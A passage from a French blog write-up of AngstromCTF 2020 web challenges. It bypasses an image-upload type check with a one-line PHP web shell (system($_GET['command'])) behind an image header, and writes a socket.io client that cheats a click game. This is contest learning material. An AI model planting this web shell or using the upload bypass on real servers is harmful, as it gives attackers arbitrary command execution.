                        <span class="kc">true</span>
                    <span class="p">))</span> <span class="p">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"Your memory isn't picturesque enough to be remembered."</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"imgfile"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">],</span> <span class="nv">$ext</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"The name of your memory doesn't seem to match its content."</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nv">$bname</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"imgfile"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
                    <span class="nv">$fname</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%s%s"</span><span class="p">,</span> <span class="nb">sha1_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"imgfile"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">]),</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$bname</span><span class="p">,</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$bname</span><span class="p">,</span> <span class="s2">"."</span><span class="p">)));</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span>
                        <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'imgfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span>
                        <span class="s2">"./memories/"</span> <span class="o">.</span> <span class="nv">$fname</span>
                    <span class="p">))</span> <span class="p">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Your memory failed to be remembered.'</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">301</span><span class="p">);</span>
                    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /memories/"</span> <span class="o">.</span> <span class="nv">$fname</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">echo</span> <span class="s2">"&lt;p&gt;"</span> <span class="o">.</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()</span> <span class="o">.</span> <span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="cp">?&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"crypt.jpg"</span> <span class="na">height=</span><span class="s">"300"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"/"</span> <span class="na">autocomplete=</span><span class="s">"off"</span> <span class="na">spellcheck=</span><span class="s">"false"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;p&gt;</span>Leave a memory:<span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">id=</span><span class="s">"imgfile"</span> <span class="na">name=</span><span class="s">"imgfile"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"imgfile"</span> <span class="na">id=</span><span class="s">"imglbl"</span><span class="nt">&gt;</span>Choose an image...<span class="nt">&lt;/label&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Descend"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;/form&gt;</span>
        <span class="nt">&lt;script&gt;</span>
            <span class="nx">imgfile</span><span class="p">.</span><span class="nx">oninput</span> <span class="o">=</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nx">imgfile</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="dl">"</span><span class="s2">satisfied</span><span class="dl">"</span><span class="p">);</span>
                <span class="nx">imglbl</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">imgfile</span><span class="p">.</span><span class="nx">files</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">name</span><span class="p">;</span>
            <span class="p">};</span>
        <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>En gros, lors d’un upload de fichier, il check si c’est un fichier de type .png, .jpg ou .bmp avec la fonction <code class="language-plaintext highlighter-rouge">finfo_file</code> de PHP. Il check également que l’extension du fichier correspond bien au type retourné par la fonction <code class="language-plaintext highlighter-rouge">finfo_file</code>. A partir de là, on suppose qu’il va falloir injecté un script PHP camouflé dans une image, car la fonction <code class="language-plaintext highlighter-rouge">finfo_file</code> va vérifier le header du fichier pour déterminer son type.
Pour cela, j’ai simplement pris une image qui trainais dans mes fichiers, j’ai supprimer tout le contenu afin de ne garder que le header, et j’ai ensuite écris mon script PHP ci-dessous:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'command'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>Avec ce script, je suis capable d’exécuter n’importe quelle commande sur le filesystem en utilisant la paramètre <code class="language-plaintext highlighter-rouge">?commande=&lt;command&gt;</code> lors d’une requête.</p>

<p><img src="/img/angstrom_2020_crypt.png" alt="Challenge" class="center-image" /></p>

<p>FLAG: <code class="language-plaintext highlighter-rouge">actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins}</code></p>

<h2 id="woooosh">Woooosh</h2>
<blockquote>
  <p><strong>DESCRIPTION</strong>: Clam’s tired of people hacking his sites so he spammed obfuscation on his <a href="https://woooosh.2020.chall.actf.co/">new game</a>. I have a feeling that behind that wall of obfuscated javascript there’s still a vulnerable site though. Can you get enough points to get the flag? I also found the <a href="https://files.actf.co/188f275d11eb621ad7308044f1af1bcbddc353335773e9201b4af88d9306b745/index.js">backend source</a>.</p>

  <p>Second instance: <a href="https://wooooosh.2020.chall.actf.co/">https://wooooosh.2020.chall.actf.co/</a></p>
</blockquote>

<p>Dans ce challenge, on doit réussir à marquer plus de 20 points sur le jeu. Le but étant de parvenir à trouver le cercle au milieu d’un amas de carré le plus de fois possible dans un temps imparti.</p>

<p><img src="/img/angstrom_2020_woosh.png" alt="Challenge" class="center-image" />
Le javascript étant obfusqué, les sources nous sont fournis dans l’énoncé du challenge.</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">exphbs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express-handlebars</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">socket</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">socket.io</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">http</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">morgan</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">morgan</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">serv</span> <span class="o">=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">io</span> <span class="o">=</span> <span class="nx">socket</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">serv</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">60600</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">rand</span><span class="p">(</span><span class="nx">bound</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">bound</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">genId</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">chars</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">abcdefghijklmnopqrstuvwxyz0123456789</span><span class="dl">"</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">64</span><span class="p">).</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">v</span> <span class="o">=&gt;</span> <span class="nx">chars</span><span class="p">[</span><span class="nx">rand</span><span class="p">(</span><span class="nx">chars</span><span class="p">.</span><span class="nx">length</span><span class="p">)]).</span><span class="nx">join</span><span class="s2">``</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">genShapes</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">20</span><span class="p">).</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">v</span> <span class="o">=&gt;</span> <span class="p">({</span> <span class="na">x</span><span class="p">:</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span> <span class="na">y</span><span class="p">:</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span> <span class="p">}));</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">pow</span><span class="p">(</span><span class="nx">c</span> <span class="o">-</span> <span class="nx">a</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">pow</span><span class="p">(</span><span class="nx">d</span> <span class="o">-</span> <span class="nx">b</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">morgan</span><span class="p">(</span><span class="dl">"</span><span class="s2">combined</span><span class="dl">"</span><span class="p">));</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kd">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">"</span><span class="s2">public</span><span class="dl">"</span><span class="p">)));</span>

<span class="kd">const</span> <span class="nx">hbs</span> <span class="o">=</span> <span class="nx">exphbs</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span>
    <span class="na">extname</span><span class="p">:</span> <span class="dl">"</span><span class="s2">.hbs</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">helpers</span><span class="p">:</span> <span class="p">{}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">engine</span><span class="p">(</span><span class="dl">"</span><span class="s2">hbs</span><span class="dl">"</span><span class="p">,</span> <span class="nx">hbs</span><span class="p">.</span><span class="nx">engine</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">view engine</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">hbs</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">views</span><span class="dl">"</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">"</span><span class="s2">views</span><span class="dl">"</span><span class="p">));</span>

<span class="nx">io</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">connection</span><span class="dl">"</span><span class="p">,</span> <span class="nx">client</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">`Client connected [id=</span><span class="p">${</span><span class="nx">client</span><span class="p">.</span><span class="nx">id</span><span class="p">}</span><span class="s2">]`</span><span class="p">)</span>
    <span class="kd">let</span> <span class="nx">game</span><span class="p">;</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nx">client</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">err</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">},</span> <span class="mi">1</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nx">endGame</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">game</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">game</span><span class="p">.</span><span class="nx">score</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">client</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span>
                        <span class="dl">"</span><span class="s2">disp</span><span class="dl">"</span><span class="p">,</span>
                        <span class="s2">`Good job! You're so good at this! The flag is </span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">}</span><span class="s2">!`</span>
                    <span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nx">client</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span>
                        <span class="dl">"</span><span class="s2">disp</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">Wow you're terrible at this! No flag for you!</span><span class="dl">"</span>
                    <span class="p">);</span>
                <span class="p">}</span>
                <span class="nx">game</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">err</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">start</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Start message receive</span><span class="dl">"</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">game</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">client</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">disp</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Game already started.</span><span class="dl">"</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">game</span> <span class="o">=</span> <span class="p">{</span>
                    <span class="na">shapes</span><span class="p">:</span> <span class="nx">genShapes</span><span class="p">(),</span>
                    <span class="na">score</span><span class="p">:</span> <span class="mi">0</span>
                <span class="p">};</span>
                <span class="nx">game</span><span class="p">.</span><span class="nx">int</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">endGame</span><span class="p">,</span> <span class="mi">10000</span><span class="p">);</span>
                <span class="nx">client</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">shapes</span><span class="dl">"</span><span class="p">,</span> <span class="nx">game</span><span class="p">.</span><span class="nx">shapes</span><span class="p">);</span>
                <span class="nx">client</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">score</span><span class="dl">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">err</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>
    <span class="nx">client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">game</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">x</span> <span class="o">!=</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">y</span> <span class="o">!=</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span><span class="p">(</span><span class="nx">game</span><span class="p">.</span><span class="nx">shapes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">x</span><span class="p">,</span> <span class="nx">game</span><span class="p">.</span><span class="nx">shapes</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">y</span><span class="p">,</span> <span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">game</span><span class="p">.</span><span class="nx">score</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nx">game</span><span class="p">.</span><span class="nx">shapes</span> <span class="o">=</span> <span class="nx">genShapes</span><span class="p">();</span>
            <span class="nx">client</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">shapes</span><span class="dl">"</span><span class="p">,</span> <span class="nx">game</span><span class="p">.</span><span class="nx">shapes</span><span class="p">);</span>
            <span class="nx">client</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">score</span><span class="dl">"</span><span class="p">,</span> <span class="nx">game</span><span class="p">.</span><span class="nx">score</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">err</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>
    <span class="nx">client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">disconnect</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">game</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">game</span><span class="p">.</span><span class="nx">int</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nx">game</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">err</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">home</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">serv</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Server listening on port </span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">!`</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>
<p>Dans un premier temps, on remarque qu’il s’agit d’un serveur <a href="https://socket.io">socket.io</a>. Je suppose déjà qu’il va falloir implémenter un client afin de simuler le comportement attendu (à savoir cliquer sur le cercle).<br />
Le fonctionnement d’un serveur <code class="language-plaintext highlighter-rouge">socket.io</code> est assez simple. Il attendu qu’un client se connecte avec <code class="language-plaintext highlighter-rouge">io.on("connection", client =&gt; {</code> pour commencer une session. Ensuite, il va attendre des messages du client pour effectuer certains actions (avec les <code class="language-plaintext highlighter-rouge">client.on(&lt;action&gt;)</code>) et il peut également envoyer des messages au client avec <code class="language-plaintext highlighter-rouge">client.emit(&lt;action&gt;, &lt;valeur&gt;)</code>.</p>

<p>Lorsqu’un utilisateur va cliquer le bouton <strong>Start game</strong> la page web, le socket client va envoyer l’action <code class="language-plaintext highlighter-rouge">start</code> au serveur. Lors de la réception de ce message, le serveur vérifie si un partie est déjà en cours auquel il demande au client d’afficher le message <code class="language-plaintext highlighter-rouge">Game already started.</code>. Sinon, il instancie une partie en générant un tableau de formes puis en initialisant le score à 0. Pour finir, il va envoyer toutes ces informations au client pour qu’il affiche les formes et le score.</p>

<p>Lorsqu’un utilisateur effectue un clique dans la zone prévu, le client envoie le message <code class="language-plaintext highlighter-rouge">click</code> au serveur. Et c’est cette fonction qui va nous intéresser car pour vérifier l’endroit sur lequel à cliquer l’utilisateur correspond bien à la position du cercle il comprare la position envoyé et la position des premier éléments du tableau de formes. Cela signifie donc que les positions du cercle seront toujours dans l’index <code class="language-plaintext highlighter-rouge">0</code> et <code class="language-plaintext highlighter-rouge">1</code> du tableau <code class="language-plaintext highlighter-rouge">game.shapes</code>.</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nx">dist</span><span class="p">(</span><span class="nx">game</span><span class="p">.</span><span class="nx">shapes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">x</span><span class="p">,</span> <span class="nx">game</span><span class="p">.</span><span class="nx">shapes</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">y</span><span class="p">,</span> <span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">game</span><span class="p">.</span><span class="nx">score</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Avec cette information, on peut facilement créer un client socket.io pour qu’à chaque fois qu’il reçoit message <code class="language-plaintext highlighter-rouge">shapes</code> avec comme valeur le tableau de forme, il renvoie un message <code class="language-plaintext highlighter-rouge">click</code> au serveur avec comme valeur les valeurs contenu dans l’index <code class="language-plaintext highlighter-rouge">1</code> et <code class="language-plaintext highlighter-rouge">0</code> du tableau reçu.</p>

<p>Voici le script final:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span>
    <span class="nx">io</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">socket.io-client</span><span class="dl">"</span><span class="p">),</span>
    <span class="nx">ioClient</span> <span class="o">=</span> <span class="nx">io</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://woooosh.2020.chall.actf.co/</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">ioClient</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">start</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">ioClient</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">shapes</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">shapes</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">shapes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">x</span><span class="p">,</span> <span class="nx">shapes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">y</span><span class="p">)</span>
        <span class="nx">ioClient</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">,</span> <span class="nx">shapes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">x</span><span class="p">,</span> <span class="nx">shapes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">y</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">err</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">});</span>
<span class="nx">ioClient</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">score</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Score: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">msg</span><span class="p">))</span>
<span class="nx">ioClient</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">disp</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Disp</span><span class="dl">"</span><span class="p">,</span> <span class="nx">msg</span><span class="p">))</span>
</code></pre></div></div>

<p>Je oublié de prendre un screenshot et de noté le flag lorsque j’ai lancé le script car comme les serveur sont stiués au US, et que je suis basé en EU, le temps de latence est impressionnant et j’ai seulement le temps de marquer 4 points, alors que sur l’instance européenne déployée par les admins du Angstrom j’ai pu marquer plus de 30 points et donc d’avoir le flag.</p>

  </article>
</div>

<div class="share-buttons">
  <h6>Share on: </h6>
  <ul>
    <li>
      <a href="https://twitter.com/intent/tweet?text=/articles/2020-03/Angstrom-CTF-web" class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
    </li>
  </ul>
</div><!-- end share-buttons -->



        <footer>
